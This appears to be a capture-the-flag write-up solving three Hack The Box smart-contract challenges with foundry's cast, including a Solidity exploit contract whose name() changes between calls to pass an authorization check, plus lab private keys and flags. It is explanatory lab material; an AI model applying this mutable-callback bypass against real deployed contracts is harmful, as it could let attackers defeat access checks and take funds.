# Setting Up

For this and the remaining challenges, I'll be using `cast` from the [`foundry-rs`](https://github.com/foundry-rs/foundry) project.

We are given two addresses and two source files.
For the addresses, we can simply `nc` them and check which one "returns" a prompt.

Said prompt will then give us the appropriate info for us to use with `cast`.

For example:
```bash
$ nc 165.227.224.40 32497
1 - Connection information
2 - Restart Instance
3 - Get flag
action? 1

Private key     :  0x5d13a13cd605a4f0a94af0176edd4687d3a188b275d00ebd572a2f56f5debe34
Address         :  0x0E4EEe092a634A204675849e49e0d5171bDC5DC9
Target contract :  0x670B024Cb9f39Ca84Df7689490B6E01F1cc18Abf
Setup contract  :  0x9CB9D7CF345Ed5bD1aC36e9561b5058CD3b486cC
```

You will also need to set the `ETH_RPC_URL` (or use the respective `cast` argument).

```bash
export ETH_RPC_URL="http://165.227.224.40:31375"
```

# Navigating the Unknown


After setup we're ready to start!
To solve the challenge we need to call `updateSensors` with `version` set to `10`.

Using cast we do the following:

```bash
$ cast abi-encode \
    "updateSensors(uint256)" \ # The function signature
    "10" # The argument
0x000000000000000000000000000000000000000000000000000000000000000a
```
> Read more about `cast abi-encode` in <https://book.getfoundry.sh/reference/cast/cast-abi-encode>

```bash
$ cast send \
    --private-key "0x5d13a13cd605a4f0a94af0176edd4687d3a188b275d00ebd572a2f56f5debe34" \
    --from "0x0E4EEe092a634A204675849e49e0d5171bDC5DC9" \
    "0x670B024Cb9f39Ca84Df7689490B6E01F1cc18Abf" \
    "updateSensors(uint256)" \
    "0x000000000000000000000000000000000000000000000000000000000000000a"

blockHash               0x901f2b7baea04f78d59bcb58501876f471b4635c2119f286eccace060d5c9d1d
blockNumber             2
contractAddress
cumulativeGasUsed       43574
effectiveGasPrice       3000000000
gasUsed                 43574
logs                    []
logsBloom               0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
root
status                  1
transactionHash         0xae620d94126d2c2fb2ecbcbf68c26d9b5de107713e7315c12c177cad1c27fec5
transactionIndex        0
type                    2
```
> Read more about `cast send` in <https://book.getfoundry.sh/reference/cast/cast-send>

The `status` being set to 1 means our transaction was successful!

Using `nc` again will yield the flag: `HTB{9P5_50FtW4R3_UPd4t3D}`

# Shooting 101

For this challenge we are given three "targets" that we need to trigger in order,
this is enforced by the `modifier`s:

```solidity
modifier firstTarget() {
    require(!firstShot && !secondShot && !thirdShot);
    _;
}
```

This one in particular means that no other flag may be set.

The first trigger is the `fallback` function:

```solidity
fallback() external payable firstTarget {
    firstShot = true;
}
```

This function is ran when other functions in the contract do not match the `calldata`,
so we will want to send some random mumbo-jumbo:

```bash
$ cast send \
    --private-key "0xc1a5a6d81de071ac8d80ebcb37cdedc49f707735f177dcb6dcdd78d6bbfcd046" \
    --from "0x15ae9ECcE13784e9EAf9a04B017b0BeffC67a80b" \
    "0x86E102233851C0496AC1566d0fe5F7f3b5D9D2a9" \
    "0x000000000000000000000000000000000000000000000000000000000000000a"
```

> For more information, check:
> - <https://docs.soliditylang.org/en/latest/contracts.html#fallback-function>
> - <https://consensys.github.io/smart-contract-best-practices/development-recommendations/solidity-specific/fallback-functions/>

For the second trigger, we have the `receive` function, which is called when some Ether is sent to the contract,
so we need to add it through the `--value` flag. We also need to take the `calldata` as `receive` does not take arguments.

```bash
$ cast send \
    --private-key "0xc1a5a6d81de071ac8d80ebcb37cdedc49f707735f177dcb6dcdd78d6bbfcd046" \
    --from "0x15ae9ECcE13784e9EAf9a04B017b0BeffC67a80b" \
    --value "10" \
    "0x86E102233851C0496AC1566d0fe5F7f3b5D9D2a9"
```

Finally, for the final function, we need to call `third`, we've done that before, let's do that again!

```bash
$ cast send \
    --private-key "0xc1a5a6d81de071ac8d80ebcb37cdedc49f707735f177dcb6dcdd78d6bbfcd046" \
    --from "0x15ae9ECcE13784e9EAf9a04B017b0BeffC67a80b" \
    "0x86E102233851C0496AC1566d0fe5F7f3b5D9D2a9" \
    "third()"
```

Using `nc` we retrieve the flag: `HTB{f33l5_n1c3_h1771n6_y0ur_74r6375}`

# The Art of Deceptions

For the final challenge, we have the following gate:

```solidity
contract HighSecurityGate {

    string[] private authorized = ["Orion", "Nova", "Eclipse"];
    string public lastEntrant;

    function enter() external {
        Entrant _entrant = Entrant(msg.sender);

        require(_isAuthorized(_entrant.name()), "Intruder detected");
        lastEntrant = _entrant.name();
    }

    // omitted the rest for brevity
}
```

It's easy enough to make a function that returns one of the provided names, however,
the setup contract checks the `lastEntrant`:

```solidity
function isSolved() public view returns (bool) {
    return TARGET.strcmp(TARGET.lastEntrant(), "Pandora");
}
```

We can't be two persons at the same time, but we can shapeshift!
If the `name` function changes between executions, we can bypass both checks.

To do that, we need to first write a contract:

```solidity
contract Exploit is Entrant {
    HighSecurityGate gate;

    bool state; // Our shapeshifting mechanism

    constructor() {
        // Initialize a contract pointing to the target
        // this is required because the Entrant is initialized with `msg.sender`
        gate = HighSecurityGate(0xcA86ffc0e038742e25eFCe36ce2Dd2C39DaAB438);
        state = true;
    }

    function name() external returns (string memory) {
        if (state) {
            state = false;
            return "Orion";
        } else {
            return "Pandora";
        }
    }

    function exploit() public {
        gate.enter();
    }

    // A receive function is required because for a contract to perform transactions
    // it requires Ether, it is not covered by the original transaction (I learned that the hard way)
    receive() external payable {}
}
```

Now we need to compile and deploy it, you can do that with the [Remix IDE for VSCode](https://marketplace.visualstudio.com/items?itemName=RemixProject.ethereum-remix).
> For more information, see: <https://coinsbench.com/compile-and-deploy-smart-contracts-inside-vscode-8226ec001806>

After deploying it, we need to set it up with some funds:

```bash
$ cast send \
    --private-key "0xa5c3a9adf848e7d418eb58140186d5c53e15fcbbb4aba6053453494e16202673" \
    --value "1000000" \
    "0xcA86ffc0e038742e25eFCe36ce2Dd2C39DaAB438"
```

And then call our exploit:
```bash
$ cast send \
    --private-key "0xa5c3a9adf848e7d418eb58140186d5c53e15fcbbb4aba6053453494e16202673" \
    --from "0xDC8Af07B6b537Fb905fA7c6ac352da33Df0871E5" \
    "0xcA86ffc0e038742e25eFCe36ce2Dd2C39DaAB438" \
    "exploit()"
```

Afterwards, just collect the flag: `HTB{H1D1n9_1n_PL41n_519H7}`

> For more information, see: <https://github.com/dabit3/foundry-cheatsheet#deploying-to-a-network>
